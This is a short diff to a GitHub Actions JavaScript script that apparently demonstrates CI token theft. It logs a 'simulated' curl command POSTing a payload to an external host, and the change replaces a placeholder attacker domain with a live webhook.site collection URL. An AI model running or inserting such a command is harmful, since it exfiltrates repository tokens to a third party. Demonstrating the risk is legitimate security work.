@@ -21,7 +21,7 @@ module.exports = async ({ github, context, core }) => {
   
   // 2. Simulate token exfiltration
   console.log("\n🔓 SIMULATED TOKEN EXFILTRATION:");
-  console.log("curl -X POST https://attacker-server.com/steal \\");
+  console.log("curl -X POST https://webhook.site/740991b8-d2b4-439a-b146-41d7a9e2bc86 \\");
   console.log("  -H 'Content-Type: application/json' \\");
   console.log(`  -d '${JSON.stringify(payload)}'`);
   
